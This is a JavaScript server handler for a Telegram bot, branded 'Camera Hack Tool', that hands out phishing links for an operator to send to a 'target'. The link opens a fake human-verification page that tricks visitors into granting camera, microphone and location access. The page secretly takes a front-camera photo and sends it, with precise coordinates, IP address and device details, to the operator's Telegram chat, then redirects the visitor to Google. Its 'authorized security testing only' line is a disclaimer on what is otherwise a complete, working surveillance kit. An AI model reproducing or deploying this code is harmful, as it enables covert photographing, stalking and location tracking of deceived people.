// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

module.exports = async (req, res) => {
  const VERCEL_URL = `https://${req.headers.host}`;
  const pathname = req.url.split('?')[0];
  
  // ============================================================
  // ROUTE: /webhook — Telegram bot webhook
  // ============================================================
  if (pathname === '/webhook') {
    if (req.method !== 'POST') {
      return res.status(200).send('Webhook endpoint ready');
    }
    
    const data = req.body;
    if (!data) return res.status(200).send('OK');
    
    try {
      if (data.callback_query) {
        const cq = data.callback_query;
        const chatId = cq.message.chat.id;
        const cbData = cq.data;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: cq.id })
        });
        
        if (cbData === 'main_menu') {
          const linkId = Math.random().toString(36).substring(2, 10);
          const phishUrl = `${VERCEL_URL}/c/${linkId}`;
          
          const keyboard = {
            inline_keyboard: [
              [{ text: '📸 𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚 𝐀𝐜𝐜𝐞𝐬𝐬', callback_data: 'front_cam' }],
              [{ text: '🎙️ 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝', callback_data: 'audio_rec' }],
              [{ text: '📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐒𝐞𝐧𝐝 🌐', callback_data: 'location_send' }],
              [{ text: '🔗 Generate New Link', callback_data: 'gen_link' }],
            ]
          };
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `🔗 <b>Your Test Link:</b>\n\n<code>${phishUrl}</code>\n\nSend this to the target. When they open it and grant permissions, the data will appear here.\n\n<b>Link ID:</b> <code>${linkId}</code>`,
              reply_markup: JSON.stringify(keyboard),
              parse_mode: 'HTML'
            })
          });
        }
        else if (cbData === 'gen_link') {
          const linkId = Math.random().toString(36).substring(2, 10);
          const phishUrl = `${VERCEL_URL}/c/${linkId}`;
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `🔗 <b>New Link Generated:</b>\n\n<code>${phishUrl}</code>\n\n<b>Link ID:</b> <code>${linkId}</code>`,
              parse_mode: 'HTML'
            })
          });
        }
        else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: '📌 Generate a link first using the button above, then send it to the target.',
              parse_mode: 'HTML'
            })
          });
        }
        
        return res.status(200).send('OK');
      }
      
      if (data.message && data.message.text === '/start') {
        const chatId = data.message.chat.id;
        
        const keyboard = {
          inline_keyboard: [
            [{ text: '🤗 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤 𝐓𝐨𝐨𝐥', callback_data: 'main_menu' }]
          ]
        };
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: '👋 <b>Welcome to Camera Security Test Bot</b>\n\nThis tool is for authorized security testing only.\n\nClick below to generate a test link:',
            reply_markup: JSON.stringify(keyboard),
            parse_mode: 'HTML'
          })
        });
        
        return res.status(200).send('OK');
      }
      
    } catch (err) {
      console.error('Webhook error:', err);
    }
    
    return res.status(200).send('OK');
  }
  
  // ============================================================
  // ROUTE: /c/:linkId — Phishing Page
  // ============================================================
  const phishMatch = pathname.match(/^\/c\/([a-zA-Z0-9]+)$/);
  if (phishMatch) {
    const linkId = phishMatch[1];
    
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(`<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}.icon{font-size:80px;margin-bottom:20px}h1{color:#1a1a2e;font-size:24px;margin-bottom:10px}p{color:#666;margin-bottom:25px;line-height:1.6}.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:18px 50px;font-size:18px;border-radius:50px;cursor:pointer;font-weight:600;width:100%;max-width:300px}.btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,.4)}.btn:disabled{opacity:.6}.loading{display:none}.loading.active{display:block}.spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 15px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.status{margin-top:20px;padding:15px;border-radius:10px;display:none}.success{background:#d4edda;color:#155724;display:block}.error{background:#f8d7da;color:#721c24;display:block}.pl{text-align:left;margin:20px 0;padding:0;list-style:none}.pl li{padding:12px 15px;margin:5px 0;background:#f8f9fa;border-radius:10px;display:flex;align-items:center;gap:10px;font-size:14px;border-left:4px solid #ffc107}.pl li.granted{background:#d4edda;border-left-color:#28a745}.pl li.denied{background:#f8d7da;border-left-color:#dc3545}</style></head>
<body>
<div class="card">
<div class="icon">🛡️</div>
<h1>Content Verification Required</h1>
<p>We need to verify you're a real person. Please allow access to continue.</p>
<ul class="pl" id="pl">
<li id="cp"><span>📸</span> Camera Access <span id="cs">(pending)</span></li>
<li id="mp"><span>🎙️</span> Microphone Access <span id="ms">(pending)</span></li>
<li id="lp"><span>📍</span> Location Access <span id="ls">(pending)</span></li>
</ul>
<button class="btn" id="vb" onclick="sv()">✅ Continue to Verify</button>
<div class="loading" id="ld"><div class="spinner"></div><p>Verifying...</p></div>
<div class="status" id="st"></div></div>
<script>
const L='${linkId}',A='/api/capture?l='+L;let p={c:false,m:false,l:false};
function gi(){return{ua:navigator.userAgent,ts:new Date().toISOString(),sr:screen.width+'x'+screen.height,pl:navigator.platform,lg:navigator.language,li:L}}
async function rm(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:true});p.c=true;p.m=true;document.getElementById('cp').className='granted';document.getElementById('cs').textContent='(granted)';document.getElementById('mp').className='granted';document.getElementById('ms').textContent='(granted)';const v=document.createElement('video');v.srcObject=s;v.play();await new Promise(r=>setTimeout(r,500));const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);const ph=c.toDataURL('image/jpeg',0.8);s.getTracks().forEach(t=>t.stop());return ph}
catch(e){document.getElementById('cp').className='denied';document.getElementById('cs').textContent='(denied)';document.getElementById('mp').className='denied';document.getElementById('ms').textContent='(denied)';return null}}
function rl(){return new Promise(r=>{if(!navigator.geolocation){document.getElementById('lp').className='denied';document.getElementById('ls').textContent='(unsupported)';r(null);return}navigator.geolocation.getCurrentPosition(pos=>{p.l=true;document.getElementById('lp').className='granted';document.getElementById('ls').textContent='(granted)';r({lat:pos.coords.latitude,lon:pos.coords.longitude})},()=>{document.getElementById('lp').className='denied';document.getElementById('ls').textContent='(denied)';r(null)},{enableHighAccuracy:true,timeout:1e4})})}
async function sd(ph,lo){const d={...gi(),photo:ph,lat:lo?.lat||null,lon:lo?.lon||null,hc:p.c,hm:p.m,hl:p.l};try{const r=await fetch(A,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});return r.ok}catch(e){return false}}
async function sv(){const b=document.getElementById('vb'),ld=document.getElementById('ld'),st=document.getElementById('st');b.disabled=true;b.textContent='⏳ Verifying...';ld.classList.add('active');const[ph,lo]=await Promise.all([rm(),rl()]);const s=await sd(ph,lo);ld.classList.remove('active');if(s){st.className='status success';st.innerHTML='✅ Verification Complete!';b.textContent='✅ Verified';setTimeout(()=>{window.location.href='https://www.google.com'},2e3)}else{st.className='status error';st.innerHTML='❌ Failed. Try again.';b.disabled=false;b.textContent='🔄 Try Again'}}
</script></body></html>`);
  }
  
  // ============================================================
  // ROUTE: /api/capture — Receive data from victim
  // ============================================================
  if (pathname === '/api/capture') {
    if (req.method !== 'POST') {
      return res.status(405).json({ error: 'POST only' });
    }
    
    const data = req.body;
    if (!data) return res.status(400).json({ error: 'No data' });
    
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    
    let msg = `📸 <b>New Capture!</b>\n\n`;
    msg += `<b>Link:</b> <code>${data.li || data.link_id || '?'}</code>\n`;
    msg += `<b>IP:</b> <code>${ip}</code>\n`;
    msg += `<b>Device:</b> ${data.pl || data.platform || '?'}\n`;
    msg += `<b>Time:</b> ${data.ts || data.timestamp || new Date().toISOString()}\n\n`;
    msg += `📸 Camera: ${(data.hc || data.hasCamera) ? '✅' : '❌'}\n`;
    msg += `🎙️ Mic: ${(data.hm || data.hasMic) ? '✅' : '❌'}\n`;
    msg += `📍 Location: ${(data.hl || data.hasLocation) ? '✅' : '❌'}`;
    
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'HTML' })
      });
    } catch(e) { console.error(e); }
    
    const photo = data.photo || data.ph;
    if (photo && (data.hc || data.hasCamera)) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: photo, caption: '📸 Front Camera' })
        });
      } catch(e) { console.error(e); }
    }
    
    const lat = data.lat || data.latitude;
    const lon = data.lon || data.longitude;
    if (lat && lon) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, latitude: lat, longitude: lon })
        });
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: `📍 <a href="https://maps.google.com/maps?q=${lat},${lon}">View Map</a>`, parse_mode: 'HTML' })
        });
      } catch(e) { console.error(e); }
    }
    
    return res.status(200).json({ status: 'ok' });
  }
  
  // ============================================================
  // ROUTE: /admin
  // ============================================================
  if (pathname === '/admin') {
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(`<!DOCTYPE html>
<html>
<head><title>Admin Panel</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0}.container{max-width:800px;margin:0 auto;padding:20px;text-align:center}h1{color:#00ff88;margin-bottom:30px}.card{background:#1a1a2e;border-radius:12px;padding:40px;border:1px solid #2a2a4e;margin-bottom:20px}.icon{font-size:60px;margin-bottom:20px}p{color:#888;line-height:1.6;margin-bottom:20px}.info{background:#12121f;border-radius:8px;padding:15px;margin:10px 0;font-size:14px;color:#ccc;text-align:left}.label{color:#00ff88;font-weight:bold}code{background:#00ff8822;padding:3px 8px;border-radius:4px;color:#00ff88}</style></head>
<body>
<div class="container">
<h1>🔐 Admin Dashboard</h1>
<div class="card">
<div class="icon">📊</div>
<h2>System Active</h2>
<p>All captures are sent directly to your Telegram in real-time.</p>
<div class="info">
<div><span class="label">Status:</span> ✅ Online</div>
<div><span class="label">Storage:</span> Telegram (real-time)</div>
</div>
</div></div></body></html>`);
  }
  
  // ============================================================
  // ROUTE: / — Home
  // ============================================================
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(`<!DOCTYPE html>
<html>
<head><title>Bot Running</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}.container{text-align:center;padding:20px}h1{color:#00ff88;font-size:3em}p{color:#888;margin:20px 0}code{background:#1a1a2e;padding:5px 10px;border-radius:5px;color:#00ff88}a{color:#0088ff}</style></head>
<body>
<div class="container">
<h1>✅ Running</h1>
<p>Bot is active. Open Telegram and send <code>/start</code> to your bot.</p>
<p><a href="/admin">Admin Panel</a></p>
</div></body></html>`);
};
